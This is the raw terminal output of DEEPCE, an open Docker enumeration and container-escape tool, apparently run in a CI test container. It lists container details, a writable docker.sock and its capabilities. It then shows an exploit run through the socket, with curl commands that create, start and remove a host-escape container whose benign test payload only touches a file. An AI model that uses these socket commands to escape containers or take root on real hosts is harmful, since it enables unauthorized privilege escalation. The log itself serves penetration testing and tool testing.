
[1;90m                      ##[1;37m         .
[1;90m                ## ## ##[1;37m        ==
[1;90m             ## ## ## ##[1;37m       ===
[1;37m         /"""""""""""""""""\___/ ===
[1;34m    ~~~ [1;90m{[1;34m~~ ~~~~ ~~~ ~~~~ ~~~ ~[1;90m /  [1;37m===-[1;34m ~~~[0m
[1;90m         \______ X           __/
[1;90m           \    \         __/
[1;90m            \____\_______/[0m
          __
     ____/ /__  ___  ____  ________
    / __  / _ \/ _ \/ __ \/ ___/ _ \ [1;90m  ENUMERATE[0m
   / /_/ /  __/  __/ /_/ / (__/  __/ [1;90m ESCALATE[0m
   \__,_/\___/\___/ .___/\___/\___/[1;90m  ESCAPE[0m
                 /_/

 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)
 by stealthcopter

[1;34m==========================================[1;32m( Colors )[1;34m==========================================[0m
[1;33m[+][1;32m Exploit Test ............ [0m[48;5;1mExploitable - Check this out[0m
[1;33m[+][1;32m Basic Test .............. [0m[1;33mPositive Result[0m
[1;33m[+][1;32m Another Test ............ [0m[1;31mError running check[0m
[1;33m[+][1;32m Negative Test ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Multi line test ......... [0m[1;33mYes[0m
[1;90mCommand output
spanning multiple lines[0m

[1;90mTips will look like this and often contains links with additional info. You can usually 
ctrl+click links in modern terminal to open in a browser window
See [4mhttps://stealthcopter.github.io/deepce[0m[0m

[1;34m===================================[1;32m( Installing Packages )[1;34m====================================[0m
fetch https://dl-cdn.alpinelinux.org/alpine/v3.13/main/x86_64/APKINDEX.tar.gz
fetch https://dl-cdn.alpinelinux.org/alpine/v3.13/community/x86_64/APKINDEX.tar.gz
(1/28) Installing fstrm (0.6.0-r1)
(2/28) Installing krb5-conf (1.0-r2)
(3/28) Installing libcom_err (1.45.7-r0)
(4/28) Installing keyutils-libs (1.6.3-r0)
(5/28) Installing libverto (0.3.1-r1)
(6/28) Installing krb5-libs (1.18.3-r1)
(7/28) Installing json-c (0.15-r1)
(8/28) Installing libgcc (10.2.1_pre1-r3)
(9/28) Installing libstdc++ (10.2.1_pre1-r3)
(10/28) Installing libprotobuf (3.13.0-r2)
(11/28) Installing libprotoc (3.13.0-r2)
(12/28) Installing protobuf-c (1.3.3-r4)
(13/28) Installing libuv (1.40.0-r0)
(14/28) Installing xz-libs (5.2.5-r0)
(15/28) Installing libxml2 (2.9.10-r6)
(16/28) Installing bind-libs (9.16.15-r1)
(17/28) Installing bind-tools (9.16.15-r1)
(18/28) Installing ca-certificates (20191127-r5)
(19/28) Installing brotli-libs (1.0.9-r3)
(20/28) Installing nghttp2-libs (1.42.0-r1)
(21/28) Installing libcurl (7.76.1-r0)
(22/28) Installing curl (7.76.1-r0)
(23/28) Installing libcap (2.46-r0)
(24/28) Installing lua5.3-libs (5.3.6-r0)
(25/28) Installing libpcap (1.10.0-r0)
(26/28) Installing pcre (8.44-r0)
(27/28) Installing libssh2 (1.9.0-r1)
(28/28) Installing nmap (7.91-r0)
Executing busybox-1.32.1-r6.trigger
Executing ca-certificates-20191127-r5.trigger
OK: 34 MiB in 42 packages
[1;34m===================================[1;32m( Enumerating Platform )[1;34m===================================[0m
[1;33m[+][1;32m Inside Container ........ [0m[1;33mYes[0m
[1;33m[+][1;32m Container Platform ...... [0m[1;33mdocker[0m
[1;33m[+][1;32m Container tools ......... [0m[1;31mNone[0m
[1;33m[+][1;32m User .................... [0m[1;33mroot[0m
[1;33m[+][1;32m Groups .................. [0m[1;90m[1;37m[48;5;1mroot[0m[1;90m bin daemon sys adm disk [1;37m[48;5;1mwheel[0m[1;90m floppy dialout tape video[0m
[1;33m[+][1;32m Docker Executable ....... [0m[1;90mNot Found[0m
[1;33m[+][1;32m Docker Sock ............. [0m[1;33mYes[0m
[1;37msrw-rw----    1 root     121            0 May  3 20:10 /var/run/docker.sock[0m
[1;33m[+][1;32m Sock is writable ........ [0m[48;5;1mYes[0m
[1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m

[1;90mTo see full info from the docker sock output run the following[0m

[1;90mcurl -s --unix-socket /var/run/docker.sock http://localhost/info[0m

[1;37mKernelVersion:5.4.0-1046-azure
OperatingSystem:Ubuntu 20.04.2 LTS
OSType:linux
Architecture:x86_64
NCPU:2
DockerRootDir:/var/lib/docker
Name:fv-az238-911
ServerVersion:20.10.6+azure[0m
[1;33m[+][1;32m Docker Version .......... [0m[1;33m20.10.6+azure[0m
[1;33m[+][1;32m CVEâ€“2019â€“13139 .......... [0m[1;90mNo[0m
[1;33m[+][1;32m CVEâ€“2019â€“5736 ........... [0m[1;90mNo[0m
[1;34m==================================[1;32m( Enumerating Container )[1;34m===================================[0m
[1;33m[+][1;32m Container ID ............ [0m[1;33mdfbbb389cdd3[0m
[1;33m[+][1;32m Container Full ID ....... [0m[1;33mdfbbb389cdd3069bc7c9b9ee7291ed3b62ba119e3eb16579ff06e40de769fdc2[0m
[1;33m[+][1;32m Container Name .......... [0m[1;31mCould not get container name through reverse DNS[0m
[1;33m[+][1;32m Container IP ............ [0m[1;33m172.17.0.2[0m
[1;33m[+][1;32m DNS Server(s) ........... [0m[1;33m168.63.129.16 [0m
[1;33m[+][1;32m Host IP ................. [0m[1;33m172.17.0.1[0m
[1;33m[+][1;32m Operating System ........ [0m[1;90mLinux[0m
[1;33m[+][1;32m Kernel .................. [0m[1;90m5.4.0-1046-azure[0m
[1;33m[+][1;32m Arch .................... [0m[1;90mx86_64[0m
[1;33m[+][1;32m CPU ..................... [0m[1;90mIntel(R) Xeon(R) Platinum 8171M CPU @ 2.60GHz[0m
[1;33m[+][1;32m Useful tools installed .. [0m[1;33mYes[0m
[1;90m/usr/bin/curl
/usr/bin/wget
/usr/bin/nc
/usr/bin/nslookup
/usr/bin/host
/bin/hostname
/usr/bin/dig
/usr/bin/nmap[0m
[1;33m[+][1;32m Dangerous Capabilities .. [0m[1;33mYes[0m
[1;90mCurrent: cap_chown,[1;37m[48;5;1mcap_dac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=eip
Bounding set =cap_chown,[1;37m[48;5;1mcap_dac_override[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Current IAB: cap_chown,[1;37m[48;5;1mcap_dac_override[0m[1;90m,![1;37m[48;5;1mcap_dac_read_search[0m[1;90m,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,!cap_linux_immutable,cap_net_bind_service,!cap_net_broadcast,!cap_net_admin,cap_net_raw,!cap_ipc_lock,!cap_ipc_owner,![1;37m[48;5;1mcap_sys_module[0m[1;90m,!cap_sys_rawio,cap_sys_chroot,![1;37m[48;5;1mcap_sys_ptrace[0m[1;90m,!cap_sys_pacct,![1;37m[48;5;1mcap_sys_admin[0m[1;90m,!cap_sys_boot,!cap_sys_nice,!cap_sys_resource,!cap_sys_time,!cap_sys_tty_config,cap_mknod,!cap_lease,cap_audit_write,!cap_audit_control,cap_setfcap,!cap_mac_override,!cap_mac_admin,!cap_syslog,!cap_wake_alarm,!cap_block_suspend,!cap_audit_read[0m
[1;33m[+][1;32m SSHD Service ............ [0m[1;90mNo[0m
[1;33m[+][1;32m Privileged Mode ......... [0m[1;90mNo[0m
[1;33m[+][1;32m Alpine Linux Version .... [0m[1;33m3.13.5[0m
[1;33m[+][1;32m â””â”€â”€ CVE-2019-5021 ....... [0m[1;90mNo[0m
[1;34m====================================[1;32m( Enumerating Mounts )[1;34m====================================[0m
[1;33m[+][1;32m Docker sock mounted ....... [0m[48;5;1mYes[0m
[1;90mThe docker sock is writable, we should be able to enumerate docker, create containers 
and obtain root privs on the host machine
See [4mhttps://stealthcopter.github.io/deepce/guides/docker-sock.md[0m[0m

[1;33m[+][1;32m Other mounts .............. [0m[1;33mYes[0m
[1;90m/home/runner/work/deepce/deepce/deepce.sh /root/deepce.sh rw,relatime - ext4 /dev/root rw,discard[0m
[1;33m[+][1;32m Possible host usernames ... [0m[1;33mrunner [0m
[1;34m====================================[1;32m( Interesting Files )[1;34m=====================================[0m
[1;33m[+][1;32m Interesting environment variables ... [0m[1;90mNo[0m
[1;90mHOME=/root
HOSTNAME=dfbbb389cdd3
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PWD=/
SHLVL=1[0m
[1;33m[+][1;32m Any common entrypoint files ......... [0m[1;33mYes[0m
[1;90m-rwxr-xr-x    1 1001     121        37.7K May  3 20:11 /root/deepce.sh[0m
[1;33m[+][1;32m Interesting files in root ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Passwords in common files ........... [0m[1;90mNo[0m
[1;33m[+][1;32m Home directories .................... [0m[1;90mNo[0m
[1;33m[+][1;32m Hashes in shadow file ............... [0m[1;90mNo permissions[0m
[1;33m[+][1;32m Searching for app dirs .............. [0m
[1;34m==================================[1;32m( Enumerating Containers )[1;34m==================================[0m
[1;90mBy default containers can communicate with other containers on the same network and the 
host machine, this can be used to enumerate further[0m

[1;31m[0mTODO Enumerate container using sock[0m
[1;34m=====================================[1;32m( Exploiting Sock )[1;34m======================================[0m

[1;33m[+][1;32m Preparing Exploit [0m[1;90m [0m
[1;33m[+][1;32m Exploit Type ............. [0m[1;90mCustom Command[0m
[1;33m[+][1;32m Custom Command ........... [0m[1;90mtouch /tmp/deepce-docker-alpine-payload-command.hacked[0m
[1;33m[+][1;32m Clean up ................. [0m[1;90mAutomatic on container exit[0m

[1;33m[+][1;32m Creating container ..... [0m[1;33m92bca736914f646160b570202d5ccef10f349f26b743d4c5a879231848fc7f63[0m
[1;33m[+][1;32m If the shell dies you can restart your listener and run the start command to fire it again [0m
[1;90mStart Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/92bca736914f646160b570202d5ccef10f349f26b743d4c5a879231848fc7f63/start[0m
[1;90mLogs Command: curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/92bca736914f646160b570202d5ccef10f349f26b743d4c5a879231848fc7f63/logs?stderr=1&stdout=1" --output -[0m
[1;33m[+][1;32m Once complete remember to tidy up by stopping and removing your container with following commands [0m
[1;90mStop Command: curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/92bca736914f646160b570202d5ccef10f349f26b743d4c5a879231848fc7f63/stop[0m
[1;90mRemove Command: curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/92bca736914f646160b570202d5ccef10f349f26b743d4c5a879231848fc7f63[0m
[1;33m[+][1;32m Starting container ..... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Sleeping for ........... [0m[1;90m2s[0m
[1;33m[+][1;32m Fetching logs .......... [0m[1;33mSuccess[0m
[1;33m[+][1;32m Exploit completed ..... [0m[1;33m:)[0m
[1;34m===============================================[1;32m[1;34m===============================================[0m
